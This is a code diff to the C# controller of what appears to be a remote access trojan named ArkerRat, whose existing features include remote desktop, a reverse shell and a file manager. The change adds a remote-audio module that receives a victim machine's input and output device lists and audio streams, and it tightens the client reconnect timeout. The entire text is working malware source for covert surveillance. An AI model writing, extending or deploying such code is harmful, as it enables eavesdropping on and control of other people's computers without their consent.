@@ -99,6 +99,8 @@ namespace ArkerRatWpfVersion
                             await Task.Run(() => SortData("§RemoteDesktopStart§", "§RemoteDesktopEnd§"));
                             await Task.Run(() => SortData("§ReverseShellStart§", "§ReverseShellEnd§"));
                             await Task.Run(() => SortData("§FileManagerStart§", "§FileManagerEnd§"));
+                            await Task.Run(() => SortData("§RemoteAudioStart§", "§RemoteAudioEnd§"));
+
 
 
 
@@ -140,23 +142,24 @@ namespace ArkerRatWpfVersion
                             reverseShellWindow.ReversShellFunction(subString);
                         }
                         else if (startDelimiter == "§RemoteDesktopStart§" && remoteDesktopWindowIsAlreadyOpen == true)
+                        {                            
+                                remoteDesktopWindow.frameQue.Enqueue(subString);   
+                        }
+                        else if (startDelimiter=="§RemoteAudioStart§")
                         {
-                            //Assing data to remotedesktop class.
-                            if (subString.Contains("§OA§") && remoteDesktopWindow.cAOVOn)
+                            if (subString.Contains("§ODS§"))
                             {
-                                //Sort out the audio data
-                                subString = subString.Replace("§OA§", string.Empty);
-                                remoteDesktopWindow.clientAudioQue.Enqueue(subString);
+                                subString = subString.Replace("§ODS§", string.Empty);
+                                Task.Run(()=> remoteAudioWindow.AddODevices(subString));
                             }
-                            else if (subString.Contains("§IA§") && remoteDesktopWindow.cAIVOn)
+                            else if (subString.Contains("§IDS§"))
                             {
-                                subString = subString.Replace("§IA§", string.Empty);
-
-                                remoteDesktopWindow.clientAudioQue.Enqueue(subString);
+                                subString = subString.Replace("§IDS§", string.Empty);
+                                Task.Run(() => remoteAudioWindow.AddIDevices(subString));
                             }
                             else
                             {
-                                remoteDesktopWindow.frameQue.Enqueue(subString);
+                                remoteAudioWindow?.EnqueAudioData(subString);
                             }
                         }
                         else if(startDelimiter == "§FileManagerStart§")
@@ -225,7 +228,6 @@ namespace ArkerRatWpfVersion
             {
                 while (!token.IsCancellationRequested)
                 {
-                    Task.Delay(1);
                     if (whenToStartPinging == "")
                     {
                         stopwatch = Stopwatch.StartNew();
@@ -240,14 +242,15 @@ namespace ArkerRatWpfVersion
                         stopwatch.Stop();
                     }
                     
-                    if (stopwatch.ElapsedMilliseconds == 25000)
+                    if (stopwatch.ElapsedMilliseconds == 10000)
                     {
                         stopwatch.Stop();
                         RemoveThisClientUI();
                         await SendData("§ReconnectStart§§ReconnectEnd§");
                     }
+                    await Task.Delay(1);
                 }
-                
+
             });
         }
        
@@ -311,6 +314,15 @@ namespace ArkerRatWpfVersion
                 }));
             }
             catch (Exception ex) { }
+
+            try
+            {
+                remoteAudioWindow.Dispatcher.BeginInvoke(new Action(() =>
+                {
+                    remoteAudioWindow.CloseWindow(null, null);
+                }));
+            }
+            catch (Exception ex) { }
         }
 
         public ReverseShellWindow reverseShellWindow;
@@ -349,6 +361,19 @@ namespace ArkerRatWpfVersion
                 fileManagerWindow.WindowState = WindowState.Normal;
                 fileManagerWindow.Activate();
                 fileManagerWindow.Show();
+            }
+        }
+
+        public RemoteAudioWindow remoteAudioWindow;
+        public bool remoteAudioWindowIsAlreadyOpen = false;
+        public void StartRemoteAudio(object sender, EventArgs e)
+        {
+            if (!remoteAudioWindowIsAlreadyOpen)
+            {
+                remoteAudioWindow = new RemoteAudioWindow(this);
+                remoteAudioWindow.WindowState = WindowState.Normal;
+                remoteAudioWindow.Activate();
+                remoteAudioWindow.Show();
             }
         }
         //____________________________________________________________
